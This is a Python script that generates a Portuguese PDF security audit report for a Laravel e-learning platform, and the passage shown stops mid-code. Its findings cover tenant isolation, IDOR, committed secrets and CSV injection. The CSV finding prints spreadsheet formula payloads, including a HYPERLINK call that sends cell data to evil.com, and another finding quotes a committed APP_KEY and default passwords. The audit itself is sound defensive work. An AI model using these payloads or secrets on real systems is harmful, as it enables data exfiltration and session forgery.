#!/usr/bin/env python3
"""
Script de Geração do Relatório de Auditoria de Segurança - Plataforma EAD
Gera o relatório técnico/executivo em formato PDF profissional (A4, pt-BR)
com gráficos em alta resolução, tabelas estilizadas e templates de issues.
"""

import os
import sys
import html
from datetime import datetime

import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt

from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.units import mm
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, KeepTogether, PageBreak, HRFlowable
)
from reportlab.pdfgen import canvas

# Diretórios e caminhos
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
PDF_PATH = os.path.join(OUTPUT_DIR, "relatorio-auditoria-seguranca.pdf")
CHARTS_DIR = os.path.join(OUTPUT_DIR, "assets")
os.makedirs(CHARTS_DIR, exist_ok=True)

# Paleta de Cores Padronizada
COLOR_CRITICA = "#B91C1C"     # Vermelho Escuro
COLOR_ALTA = "#EA580C"        # Laranja Escuro
COLOR_MEDIA = "#D97706"       # Âmbar / Amarelo
COLOR_BAIXA = "#2563EB"       # Azul
COLOR_PONTO_FORTE = "#059669" # Verde Esmeralda

COLOR_TEXT_MAIN = "#1E293B"   # Slate 800
COLOR_TEXT_MUTED = "#64748B"  # Slate 500
COLOR_BG_CARD = "#F8FAFC"     # Slate 50
COLOR_BORDER = "#E2E8F0"      # Slate 200
COLOR_NAVY_DARK = "#0F172A"   # Slate 900
COLOR_ACCENT = "#4F46E5"      # Indigo 600

class NumberedCanvas(canvas.Canvas):
    """Canvas com paginação de duas etapas: 'Página X de Y' e cabeçalho institucional."""
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._saved_page_states = []

    def showPage(self):
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        num_pages = len(self._saved_page_states)
        for state in self._saved_page_states:
            self.__dict__.update(state)
            self.draw_page_decorations(num_pages)
            super().showPage()
        super().save()

    def draw_page_decorations(self, page_count):
        self.saveState()
        self.setFont("Helvetica", 8)
        self.setFillColor(colors.HexColor(COLOR_TEXT_MUTED))

        # Cabeçalho (Páginas > 1)
        if self._pageNumber > 1:
            self.drawString(18 * mm, 287 * mm, "Plataforma EAD — Relatório Técnico de Auditoria de Segurança de Código")
            self.drawRightString(192 * mm, 287 * mm, "Confidencial | Versão 1.0")
            self.setStrokeColor(colors.HexColor(COLOR_BORDER))
            self.setLineWidth(0.6)
            self.line(18 * mm, 284 * mm, 192 * mm, 284 * mm)

        # Rodapé em todas as páginas
        self.setStrokeColor(colors.HexColor(COLOR_BORDER))
        self.setLineWidth(0.6)
        self.line(18 * mm, 15 * mm, 192 * mm, 15 * mm)

        self.drawString(18 * mm, 10 * mm, "Plataforma EAD — Avaliação de Segurança Estática e Arquitetural (SAST & DAST Logic)")
        page_str = f"Página {self._pageNumber} de {page_count}"
        self.drawRightString(192 * mm, 10 * mm, page_str)
        self.restoreState()


def generate_charts():
    """Gera gráficos profissionais com matplotlib."""
    chart_sev_path = os.path.join(CHARTS_DIR, "chart_severities.png")
    chart_cat_path = os.path.join(CHARTS_DIR, "chart_categories.png")

    # 1. Gráfico de Rosca - Severidades
    labels = ['Crítica', 'Alta', 'Média', 'Baixa']
    counts = [0, 1, 3, 2]
    colors_pie = [COLOR_CRITICA, COLOR_ALTA, COLOR_MEDIA, COLOR_BAIXA]

    non_zero = [(l, c, col) for l, c, col in zip(labels, counts, colors_pie) if c > 0]
    labels_nz = [x[0] for x in non_zero]
    counts_nz = [x[1] for x in non_zero]
    colors_nz = [x[2] for x in non_zero]

    fig, ax = plt.subplots(figsize=(4.5, 3.2), dpi=220)
    wedges, texts, autotexts = ax.pie(
        counts_nz,
        labels=labels_nz,
        autopct='%1.0f%%',
        startangle=140,
        colors=colors_nz,
        pctdistance=0.75,
        wedgeprops=dict(width=0.42, edgecolor='white', linewidth=2),
        textprops=dict(color=COLOR_TEXT_MAIN, fontsize=9, fontweight='bold')
    )
    for at in autotexts:
        at.set_color('white')
        at.set_fontsize(9)
        at.set_fontweight('bold')

    ax.text(0, 0, f"Total\n6", ha='center', va='center', fontsize=13, fontweight='bold', color=COLOR_NAVY_DARK)
    ax.set_title("Vulnerabilidades por Severidade", fontsize=11, fontweight='bold', color=COLOR_NAVY_DARK, pad=10)
    plt.tight_layout()
    plt.savefig(chart_sev_path, transparent=True)
    plt.close()

    # 2. Gráfico de Barras Horizontais - Categorias
    cats = [
        '1. Banco sem Tranca',
        '2. Permissão no Navegador',
        '3. IDOR / Escopo de Objeto',
        '4. Chaves Expostas',
        '5. Inputs / Injeção CSV'
    ]
    cat_counts = [1, 1, 1, 2, 1]
    bar_colors = [COLOR_MEDIA, COLOR_BAIXA, COLOR_MEDIA, COLOR_ALTA, COLOR_MEDIA]

    fig, ax = plt.subplots(figsize=(5.5, 3.2), dpi=220)
    y_pos = range(len(cats))
    bars = ax.barh(y_pos, cat_counts, color=bar_colors, height=0.55, edgecolor='none')

    ax.set_yticks(y_pos)
    ax.set_yticklabels(cats, fontsize=8.5, fontweight='bold', color=COLOR_TEXT_MAIN)
    ax.invert_yaxis()
    ax.set_xlim(0, 3)
    ax.set_xlabel("Quantidade de Apontamentos", fontsize=8.5, color=COLOR_TEXT_MUTED)
    ax.xaxis.set_major_locator(plt.MaxNLocator(integer=True))
    ax.grid(axis='x', linestyle='--', alpha=0.3)
    ax.set_axisbelow(True)
    ax.spines['top'].set_visible(False)
    ax.spines['right'].set_visible(False)
    ax.spines['left'].set_color(COLOR_BORDER)
    ax.spines['bottom'].set_color(COLOR_BORDER)

    for bar in bars:
        w = bar.get_width()
        ax.text(w + 0.08, bar.get_y() + bar.get_height()/2, f"{int(w)}",
                ha='left', va='center', fontsize=9, fontweight='bold', color=COLOR_NAVY_DARK)

    ax.set_title("Apontamentos por Categoria Auditada", fontsize=11, fontweight='bold', color=COLOR_NAVY_DARK, pad=10)
    plt.tight_layout()
    plt.savefig(chart_cat_path, transparent=True)
    plt.close()

    return chart_sev_path, chart_cat_path


def format_code_block(code_text: str) -> str:
    """Escapa entidades HTML e converte quebras de linha e indentação para o ReportLab."""
    escaped = html.escape(code_text)
    # Substituir quebras de linha e espaços para manter alinhamento
    lines = escaped.splitlines()
    formatted_lines = []
    for line in lines:
        leading_spaces = len(line) - len(line.lstrip(' '))
        line_content = ('&nbsp;' * (leading_spaces * 2)) + line.lstrip(' ')
        formatted_lines.append(line_content)
    return "<br/>".join(formatted_lines)


def build_pdf():
    chart_sev, chart_cat = generate_charts()

    doc = SimpleDocTemplate(
        PDF_PATH,
        pagesize=A4,
        leftMargin=18 * mm,
        rightMargin=18 * mm,
        topMargin=20 * mm,
        bottomMargin=20 * mm
    )

    styles = getSampleStyleSheet()

    title_style = ParagraphStyle(
        'DocTitle',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=20,
        leading=24,
        textColor=colors.HexColor(COLOR_NAVY_DARK),
        spaceAfter=4
    )

    subtitle_style = ParagraphStyle(
        'DocSubtitle',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=11,
        leading=15,
        textColor=colors.HexColor(COLOR_TEXT_MUTED),
        spaceAfter=14
    )

    h1_style = ParagraphStyle(
        'SectionH1',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=13,
        leading=17,
        textColor=colors.HexColor(COLOR_NAVY_DARK),
        spaceBefore=14,
        spaceAfter=8,
        keepWithNext=True
    )

    h2_style = ParagraphStyle(
        'SectionH2',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=10.5,
        leading=14,
        textColor=colors.HexColor(COLOR_NAVY_DARK),
        spaceBefore=8,
        spaceAfter=4,
        keepWithNext=True
    )

    body_style = ParagraphStyle(
        'BodyDark',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=8.5,
        leading=12.5,
        textColor=colors.HexColor(COLOR_TEXT_MAIN),
        spaceAfter=6
    )

    bullet_style = ParagraphStyle(
        'BulletStyle',
        parent=body_style,
        leftIndent=12,
        firstLineIndent=-8,
        spaceAfter=4
    )

    code_style = ParagraphStyle(
        'CodeSnippet',
        parent=styles['Normal'],
        fontName='Courier',
        fontSize=7.2,
        leading=9.8,
        textColor=colors.HexColor("#0F172A"),
        backColor=colors.HexColor("#F1F5F9"),
        borderPadding=6,
        spaceBefore=4,
        spaceAfter=6,
        borderRadius=3
    )

    badge_style = ParagraphStyle(
        'BadgeText',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=7.5,
        leading=9,
        alignment=1
    )

    story = []

    # ==========================================
    # 1. CABEÇALHO / CAPA EXECUTIVA
    # ==========================================
    header_table_data = [
        [
            Paragraph("<b>RELATÓRIO DE AUDITORIA DE SEGURANÇA</b>", ParagraphStyle('HdrTop', fontName='Helvetica-Bold', fontSize=8, textColor=colors.HexColor(COLOR_ACCENT))),
            Paragraph("<b>CONFIDENCIAL — USO INTERNO</b>", ParagraphStyle('HdrRight', fontName='Helvetica-Bold', fontSize=8, alignment=2, textColor=colors.HexColor(COLOR_TEXT_MUTED)))
        ]
    ]
    t_hdr = Table(header_table_data, colWidths=[100*mm, 74*mm])
    t_hdr.setStyle(TableStyle([
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('BOTTOMPADDING', (0,0), (-1,-1), 0),
        ('TOPPADDING', (0,0), (-1,-1), 0),
    ]))
    story.append(t_hdr)
    story.append(Spacer(1, 4*mm))

    story.append(Paragraph("Auditoria de Código-Fonte e Arquitetura", title_style))
    story.append(Paragraph("Plataforma EAD — Avaliação Preventiva das 5 Categorias Críticas de Segurança Web", subtitle_style))
    story.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor(COLOR_NAVY_DARK), spaceAfter=10))

    # Metadados Executivos do Projeto em Tabela Card
    meta_table_data = [
        [
            Paragraph("<b>Sistema Avaliado:</b> Plataforma EAD Multi-tenant", body_style),
            Paragraph(f"<b>Data da Auditoria:</b> {datetime.now().strftime('%d/%m/%Y')}", body_style)
        ],
        [
            Paragraph("<b>Escopo:</b> Código PHP/Laravel, Blade, JS, Docker, CI/CD", body_style),
            Paragraph("<b>Classificação de Risco:</b> <font color='#D97706'><b>MODERADO A BAIXO</b></font>", body_style)
        ],
        [
            Paragraph("<b>Versão da Stack:</b> PHP 8.5 / Laravel 13 / Sail Docker", body_style),
            Paragraph("<b>Veredito Geral:</b> Arquitetura Robusta com 6 Ajustes", body_style)
        ]
    ]
    t_meta = Table(meta_table_data, colWidths=[90*mm, 84*mm])
    t_meta.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), colors.HexColor(COLOR_BG_CARD)),
        ('BOX', (0,0), (-1,-1), 0.8, colors.HexColor(COLOR_BORDER)),
        ('INNERGRID', (0,0), (-1,-1), 0.5, colors.HexColor(COLOR_BORDER)),
        ('TOPPADDING', (0,0), (-1,-1), 5),
        ('BOTTOMPADDING', (0,0), (-1,-1), 5),
        ('LEFTPADDING', (0,0), (-1,-1), 8),
        ('RIGHTPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(t_meta)
    story.append(Spacer(1, 5*mm))

    # ==========================================
    # 2. DETECÇÃO DA STACK E MAPEAMENTO
    # ==========================================
    story.append(Paragraph("1. Detecção da Stack & Mapeamento de Ameaças", h1_style))
    story.append(Paragraph(
        "Antes do início da varredura, a arquitetura e dependências do repositório foram mapeadas para calibrar "
        "o modelo de ameaças contra o conjunto real de tecnologias em execução:",
        body_style
    ))

    stack_data = [
        [Paragraph("<b>Camada</b>", body_style), Paragraph("<b>Tecnologia Identificada</b>", body_style), Paragraph("<b>Equivalência e Foco do Teste de Segurança</b>", body_style)],
        [
            Paragraph("<b>Runtime & Linguagem</b>", body_style),
            Paragraph("PHP 8.5 (CLI / FPM / Sail)", body_style),
            Paragraph("Tipagem estrita, null-safety, ausência de funções perigosas (eval, exec).", body_style)
        ],
        [
            Paragraph("<b>Framework Web</b>", body_style),
            Paragraph("Laravel 13 + Boost MCP", body_style),
            Paragraph("Proteção CSRF, Eloquent global scopes, validação via Form Requests e Policies.", body_style)
        ],
        [
            Paragraph("<b>Autenticação & Sessão</b>", body_style),
            Paragraph("Multi-tenant Host-Scoped (<code>org-credential</code>)", body_style),
            Paragraph("Credenciais por inquilino, isolamento por subdomínio/host e impersonação segura.", body_style)
        ],
        [
            Paragraph("<b>Frontend & UI</b>", body_style),
            Paragraph("Blade Templates + Bootstrap 5.3 + Vite", body_style),
            Paragraph("Escape automático <code>{{ }}</code>, validação de <code>{!! !!}</code> e DOM seguro em módulos JS.", body_style)
        ],
        [
            Paragraph("<b>Infra & CI/CD</b>", body_style),
            Paragraph("Docker Compose (Sail) + GitHub Actions", body_style),
            Paragraph("Credenciais padrão em containers, senhas no MySQL e chaves no Git/CI.", body_style)
        ],
    ]
    t_stack = Table(stack_data, colWidths=[38*mm, 52*mm, 84*mm])
    t_stack.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#F1F5F9")),
        ('BOX', (0,0), (-1,-1), 0.8, colors.HexColor(COLOR_BORDER)),
        ('INNERGRID', (0,0), (-1,-1), 0.5, colors.HexColor(COLOR_BORDER)),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ('LEFTPADDING', (0,0), (-1,-1), 6),
        ('RIGHTPADDING', (0,0), (-1,-1), 6),
    ]))
    story.append(t_stack)
    story.append(Spacer(1, 5*mm))

    # ==========================================
    # 3. SUMÁRIO EXECUTIVO & GRÁFICOS
    # ==========================================
    story.append(Paragraph("2. Sumário Executivo & Distribuição de Vulnerabilidades", h1_style))
    story.append(Paragraph(
        "A auditoria identificou um total de <b>6 apontamentos acionáveis</b> e <b>10 pontos fortes arquiteturais</b> "
        "altamente consistentes. O sistema demonstra maturidade elevada no isolamento de inquilinos através do <code>OrgScope</code>, "
        "não havendo vulnerabilidades críticas ativas que permitam invasão sem autenticação. Os riscos concentram-se "
        "em <b>segredos de teste commitados no repositório</b>, <b>injeção de fórmulas em planilhas CSV</b> e "
        "<b>leitura em memória no módulo de moderação</b>.",
        body_style
    ))

    charts_table_data = [
        [
            Image(chart_sev, width=82*mm, height=58*mm),
            Image(chart_cat, width=92*mm, height=58*mm)
        ]
    ]
    t_charts = Table(charts_table_data, colWidths=[85*mm, 89*mm])
    t_charts.setStyle(TableStyle([
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('TOPPADDING', (0,0), (-1,-1), 0),
        ('BOTTOMPADDING', (0,0), (-1,-1), 0),
        ('LEFTPADDING', (0,0), (-1,-1), 0),
        ('RIGHTPADDING', (0,0), (-1,-1), 0),
    ]))
    story.append(t_charts)
    story.append(Spacer(1, 6*mm))

    # ==========================================
    # TABELA SÍNTESE DE ACHADOS
    # ==========================================
    story.append(Paragraph("3. Tabela Consolidada de Apontamentos", h1_style))

    summary_headers = [
        Paragraph("<b>ID</b>", body_style),
        Paragraph("<b>Título do Apontamento</b>", body_style),
        Paragraph("<b>Categoria</b>", body_style),
        Paragraph("<b>Severidade</b>", body_style),
        Paragraph("<b>Localização Principal</b>", body_style)
    ]

    sev_badge_alta = Paragraph("<b><font color='white'>ALTA</font></b>", ParagraphStyle('BAlta', parent=badge_style, textColor=colors.white))
    sev_badge_media = Paragraph("<b><font color='white'>MÉDIA</font></b>", ParagraphStyle('BMed', parent=badge_style, textColor=colors.white))
    sev_badge_baixa = Paragraph("<b><font color='white'>BAIXA</font></b>", ParagraphStyle('BBai', parent=badge_style, textColor=colors.white))

    findings_summary_rows = [
        summary_headers,
        [
            Paragraph("<b>SEC-01</b>", body_style),
            Paragraph("Leitura Irrestrita de Denúncias no Banco com Filtro em Memória", body_style),
            Paragraph("1. Banco Sem Tranca", body_style),
            sev_badge_media,
            Paragraph("<code>ForumModerationController.php:38</code>", body_style)
        ],
        [
            Paragraph("<b>SEC-02</b>", body_style),
            Paragraph("Inconsistência de Lógica de Gate entre Blade e Policy no Fórum", body_style),
            Paragraph("2. Permissão Navegador", body_style),
            sev_badge_baixa,
            Paragraph("<code>resources/views/forum/show.blade.php:19</code>", body_style)
        ],
        [
            Paragraph("<b>SEC-03</b>", body_style),
            Paragraph("Desacoplamento entre Parâmetro {course} e Objeto Denunciado", body_style),
            Paragraph("3. IDOR / Escopo", body_style),
            sev_badge_media,
            Paragraph("<code>ForumReportController.php:30</code>", body_style)
        ],
        [
            Paragraph("<b>SEC-04</b>", body_style),
            Paragraph("Chave Criptográfica Fixa (APP_KEY) e Senhas Commitadas no Git", body_style),
            Paragraph("4. Chaves Expostas", body_style),
            sev_badge_alta,
            Paragraph("<code>.env.dusk.ci:3, .env.dusk.local:3</code>", body_style)
        ],
        [
            Paragraph("<b>SEC-05</b>", body_style),
            Paragraph("Fallback para Senha Vazia de Banco em Arquivo de Configuração", body_style),
            Paragraph("4. Chaves Expostas", body_style),
            sev_badge_baixa,
            Paragraph("<code>config/database.php:54,74</code>", body_style)
        ],
        [
            Paragraph("<b>SEC-06</b>", body_style),
            Paragraph("Injeção de Fórmulas em Exportação CSV (CWE-1236)", body_style),
            Paragraph("5. Inputs / Injeção", body_style),
            sev_badge_media,
            Paragraph("<code>CsvStreamExportService.php:84</code><br/><code>AuditLogController.php:77</code>", body_style)
        ]
    ]

    t_findings_sum = Table(findings_summary_rows, colWidths=[15*mm, 58*mm, 35*mm, 20*mm, 46*mm])
    t_findings_sum.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#F1F5F9")),
        ('BOX', (0,0), (-1,-1), 0.8, colors.HexColor(COLOR_BORDER)),
        ('INNERGRID', (0,0), (-1,-1), 0.5, colors.HexColor(COLOR_BORDER)),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ('LEFTPADDING', (0,0), (-1,-1), 5),
        ('RIGHTPADDING', (0,0), (-1,-1), 5),
        ('BACKGROUND', (3,1), (3,1), colors.HexColor(COLOR_MEDIA)),
        ('BACKGROUND', (3,2), (3,2), colors.HexColor(COLOR_BAIXA)),
        ('BACKGROUND', (3,3), (3,3), colors.HexColor(COLOR_MEDIA)),
        ('BACKGROUND', (3,4), (3,4), colors.HexColor(COLOR_ALTA)),
        ('BACKGROUND', (3,5), (3,5), colors.HexColor(COLOR_BAIXA)),
        ('BACKGROUND', (3,6), (3,6), colors.HexColor(COLOR_MEDIA)),
    ]))
    story.append(t_findings_sum)
    story.append(Spacer(1, 8*mm))

    # ==========================================
    # 4. DETALHAMENTO DE CADA VULNERABILIDADE
    # ==========================================
    story.append(Paragraph("4. Detalhamento dos Apontamentos de Segurança", h1_style))
    story.append(Paragraph(
        "A seguir são apresentados os detalhes técnicos de cada vulnerabilidade, abrangendo a mecânica de falha, "
        "o arquivo e linhas afetadas, o cenário de exploração e o código de correção recomendado.",
        body_style
    ))
    story.append(Spacer(1, 3*mm))

    def render_finding_box(f_id, title, cat, sev, sev_color, loc, desc, impact, code_snippet, fix_code):
        content = []
        hdr_data = [
            [
                Paragraph(f"<b>{f_id} — {title}</b>", ParagraphStyle('FTitle', fontName='Helvetica-Bold', fontSize=10, textColor=colors.HexColor(COLOR_NAVY_DARK))),
                Paragraph(f"<b><font color='white'>{sev}</font></b>", ParagraphStyle('FBadge', parent=badge_style, textColor=colors.white))
            ]
        ]
        t_fhdr = Table(hdr_data, colWidths=[140*mm, 34*mm])
        t_fhdr.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (0,0), colors.HexColor("#F8FAFC")),
            ('BACKGROUND', (1,0), (1,0), colors.HexColor(sev_color)),
            ('BOX', (0,0), (-1,-1), 0.8, colors.HexColor(COLOR_BORDER)),
            ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('LEFTPADDING', (0,0), (-1,-1), 6),
            ('RIGHTPADDING', (0,0), (-1,-1), 6),
        ]))
        content.append(t_fhdr)

        details_data = [
            [Paragraph("<b>Categoria:</b>", body_style), Paragraph(cat, body_style)],
            [Paragraph("<b>Localização:</b>", body_style), Paragraph(f"<code>{loc}</code>", body_style)],
            [Paragraph("<b>Mecânica:</b>", body_style), Paragraph(desc, body_style)],
            [Paragraph("<b>Impacto / Risco:</b>", body_style), Paragraph(impact, body_style)],
            [Paragraph("<b>Código Vulnerável:</b>", body_style), Paragraph(format_code_block(code_snippet), code_style)],
            [Paragraph("<b>Correção Proposta:</b>", body_style), Paragraph(format_code_block(fix_code), code_style)],
        ]
        t_fbody = Table(details_data, colWidths=[30*mm, 144*mm])
        t_fbody.setStyle(TableStyle([
            ('BOX', (0,0), (-1,-1), 0.8, colors.HexColor(COLOR_BORDER)),
            ('INNERGRID', (0,0), (-1,-1), 0.5, colors.HexColor(COLOR_BORDER)),
            ('BACKGROUND', (0,0), (0,-1), colors.HexColor("#F8FAFC")),
            ('VALIGN', (0,0), (-1,-1), 'TOP'),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
            ('LEFTPADDING', (0,0), (-1,-1), 6),
            ('RIGHTPADDING', (0,0), (-1,-1), 6),
        ]))
        content.append(t_fbody)
        content.append(Spacer(1, 5*mm))
        return KeepTogether(content)

    # SEC-04
    story.append(render_finding_box(
        f_id="SEC-04",
        title="Chaves Criptográficas Fixas (APP_KEY) e Senhas Commitadas no Repositório",
        cat="4. Chaves Expostas (Secrets & Git Hygiene)",
        sev="SEVERIDADE ALTA",
        sev_color=COLOR_ALTA,
        loc=".env.dusk.ci:3, .env.dusk.local:3, .github/workflows/ci.yml:18,21,79",
        desc="O repositório armazena diretamente em controle de versão arquivos de ambiente (.env.dusk.local e .env.dusk.ci) contendo um APP_KEY idêntico e estático (base64:kfLeesLwsdH3CDfQmyaBM7JBqg4ve02+ciNOHOC604c=), senhas padrão do banco MySQL ('password') e credenciais de infraestrutura. Além disso, o arquivo .gitignore ignora apenas .env e .env.backup, deixando passar novos arquivos .env.*.",
        impact="Se qualquer ambiente de homologação, staging ou produção reutilizar acidentalmente essa chave criptográfica ou configuração de ambiente, um atacante em posse do APP_KEY pode forjar cookies de sessão do Laravel (laravel_session), descriptografar dados sensíveis do banco e realizar personificação de qualquer usuário administrativo.",
        code_snippet="""// .env.dusk.local e .env.dusk.ci
APP_KEY=base64:kfLeesLwsdH3CDfQmyaBM7JBqg4ve02+ciNOHOC604c=
DB_PASSWORD=password

// .github/workflows/ci.yml:18,21,79
MYSQL_ROOT_PASSWORD: password
MYSQL_PASSWORD: password""",
        fix_code="""# 1. Atualizar .gitignore para ignorar qualquer .env.* exceto .env.example:
.env
.env.*
!.env.example
!.env.*.example

# 2. Remover arquivos rastreados do git sem apagá-los localmente:
git rm --cached .env.dusk.local .env.dusk.ci

# 3. No CI (.github/workflows/ci.yml), gerar chave dinamicamente no runner:
- run: php artisan key:generate --env=testing"""
    ))

    # SEC-01
    story.append(render_finding_box(
        f_id="SEC-01",
        title="Leitura Irrestrita de Denúncias no Banco com Filtro em Memória",
        cat="1. Banco Sem Tranca (Isolamento de Tenant no Banco)",
        sev="SEVERIDADE MÉDIA",
        sev_color=COLOR_MEDIA,
        loc="app/Http/Controllers/ForumModerationController.php:38-48",
        desc="A tabela forum_reports não possui coluna org_id direta. Ao listar a fila de moderação pendente para um Gestor, o controller executa ForumReport::query()->where('status', 'pending')->with('reporter')->get(), buscando TODAS as denúncias e dados pessoais de relatores (e-mails, nomes) de todas as organizações para a memória da aplicação PHP, aplicando o filtro de autorização ($user->can('view', $postable)) apenas em nível de Collection.",
        impact="Violação do princípio de banco com tranca: dados de outros inquilinos trafegam na rede e residem na memória do processo do PHP-FPM. Conforme a plataforma cresce em número de inquilinos e denúncias, este comportamento causará degradação de performance (OOM / Denial of Service) e risco de vazamento colateral em logs ou APMs.",
        code_snippet="""// ForumModerationController.php:38-48
$reports = ForumReport::query()
    ->where('status', 'pending')
    ->with('reporter')
    ->orderBy('created_at')
    ->get() // BUSCA TODAS AS DENÚNCIAS DO SISTEMA INTEIRO!
    ->filter(function (ForumReport $report) use ($user): bool {
        $postable = $this->resolvePostable($report);
        return $postable !== null && $user->can('view', $postable);
    })->values();""",
        fix_code="""// Filtrar no banco pelo contexto do Gestor através do postable (Course/Org):
$orgId = OrgContext::current()->orgId();

$reports = ForumReport::query()
    ->where('status', 'pending')
    ->where(function ($query) use ($orgId) {
        $query->whereHasMorph('postable', [ForumTopic::class], fn ($q) => $q->where('org_id', $orgId))
              ->orWhereHasMorph('postable', [ForumReply::class], fn ($q) => 
                  $q->whereHas('topic', fn ($t) => $t->where('org_id', $orgId)));
    })
    ->with('reporter')
    ->orderBy('created_at')
    ->get();"""
    ))

    # SEC-03
    story.append(render_finding_box(
        f_id="SEC-03",
        title="Desacoplamento entre Parâmetro de Rota {course} e Objeto Denunciado",
        cat="3. IDOR / Manipulação de Parâmetros de Objeto",
        sev="SEVERIDADE MÉDIA",
        sev_color=COLOR_MEDIA,
        loc="app/Http/Controllers/ForumReportController.php:30-36, 56",
        desc="A rota de denúncia é estruturada como POST courses/{course}/forum/report. O middleware EnsureStudentIsEnrolled valida se o aluno está matriculado no curso {course} da URL. No entanto, o método resolvePostable busca o ID enviado no body ($request->validated('postable_id')) utilizando directly withoutGlobalScopes()->findOrFail($postableId), sem checar se o tópico ou resposta pertence ao {course} indicado na rota.",
        impact="Permite que um usuário matriculado no Curso A denuncie conteúdos de um Curso B (caso também tenha matrícula no Curso B) disparando a requisição sob o escopo e endpoint do Curso A, quebrando a integridade semântica da rota, registros de auditoria e métricas de denúncia associadas ao curso.",
        code_snippet="""// ForumReportController.php:30-36, 56
public function store(StoreForumReportRequest $request, int $course): JsonResponse {
    $postable = $this->resolvePostable(
        $request->validated('postable_type'),
        (int) $request->validated('postable_id'),
    );
    // ... falta verificar se $postable->course_id === $course!
}

protected function resolvePostable(string $type, int $id): ForumTopic|ForumReply {
    return $modelClass::query()->withoutGlobalScopes()->findOrFail($id);
}""",
        fix_code="""// Validar pertencimento estrito do postable ao curso da rota:
$courseModel = Course::query()->withoutGlobalScopes()->findOrFail($course);
$targetCourseId = $postable instanceof ForumTopic 
    ? $postable->course_id 
    : $postable->topic->course_id;

abort_if((int) $targetCourseId !== (int) $courseModel->id, 404, 'Publicação não pertence a este curso.');"""
    ))

    # SEC-06
    story.append(render_finding_box(
        f_id="SEC-06",
        title="Injeção de Fórmulas em Exportação CSV (Spreadsheet / CSV Formula Injection - CWE-1236)",
        cat="5. Inputs Sem Tratamento / Injeção",
        sev="SEVERIDADE MÉDIA",
        sev_color=COLOR_MEDIA,
        loc="app/Services/CsvStreamExportService.php:84-91, app/Http/Controllers/AuditLogController.php:77-84",
        desc="Nas rotas de exportação de matrículas, certificados e logs de auditoria, campos preenchidos por usuários (como nome do aluno, título do curso e especialmente o cabeçalho HTTP User-Agent gravado em audit_logs) são inseridos diretamente no arquivo CSV gerado via fputcsv sem sanitização de caracteres de fórmula (=, +, -, @, \\t, \\r).",
        impact="Um invasor ou usuário malicioso pode cadastrar seu nome ou disparar requisições web com um User-Agent malicioso (ex: =cmd|'/C calc'!A0 ou =HYPERLINK(\"http://evil.com/leak?d=\"&A1,\"Erro\")). Quando um Gestor ou Administrador exportar e abrir a planilha no Microsoft Excel ou LibreOffice Calc, as fórmulas serão interpretadas e executadas com os privilégios do operador.",
        code_snippet="""// CsvStreamExportService.php:84-91
fputcsv($handle, [
    $row->student_name,  // DADO FORNECIDO PELO USUÁRIO!
    $row->student_email,
    $row->course_name,
    $row->status,
    $row->progress_percentage,
    $row->enrolled_at,
]);

// AuditLogController.php:83
fputcsv($handle, [ ..., $row->user_agent ]); // USER-AGENT É 100% CONTROLADO PELO ATACANTE!""",
        fix_code="""// Função auxiliar para sanitizar células antes do fputcsv:
function sanitizeCsvCell(mixed $value): mixed {
    if (! is_string($value)) return $value;
    $triggers = ['=', '+', '-', '@', \"\\t\", \"\\r\"];
    if (in_array(substr($value, 0, 1), $triggers, true)) {
        return \"'\" . $value; // Prefixa com apóstrofo para neutralizar fórmula
    }
    return $value;
}"""
    ))

    # SEC-02
    story.append(render_finding_box(
        f_id="SEC-02",
        title="Inconsistência de Lógica de Gate entre Blade e Policy no Fórum",
        cat="2. Permissão Definida no Navegador vs Servidor",
        sev="SEVERIDADE BAIXA",
        sev_color=COLOR_BAIXA,
        loc="resources/views/forum/show.blade.php:19-21",
        desc="Na visualização de tópicos do fórum, o Blade calcula a exibição do botão 'Denunciar' através de regras manuais embutidas: $canReportTopic = auth()->check() && (int) auth()->id() !== (int) $topic->user_id && ! $isStaffTopic;, em vez de invocar a autorização nativa @can('report', $topic). Embora o backend valide $request->user()->can('report', $postable) no controller (o que impede bypass no servidor), o desacoplamento de lógica no frontend introduz risco de drift funcional.",
        impact="Risco de drift e inconsistência visual: caso a regra de negócio da Policy mude (ex: suspensão de denúncia para alunos bloqueados ou cursos arquivados), a interface continuará exibindo o botão para usuários que receberão 403 no servidor ao clicar.",
        code_snippet="""// resources/views/forum/show.blade.php:19-21
$canReportTopic = auth()->check()
    && (int) auth()->id() !== (int) $topic->user_id
    && ! $isStaffTopic; // Cálculo manual da permissão no Blade""",
        fix_code="""// Utilizar a Policy centralizada diretamente no Blade:
$canReportTopic = auth()->user()?->can('report', $topic) ?? false;

// Ou utilizar a diretiva nativa:
@can('report', $topic)
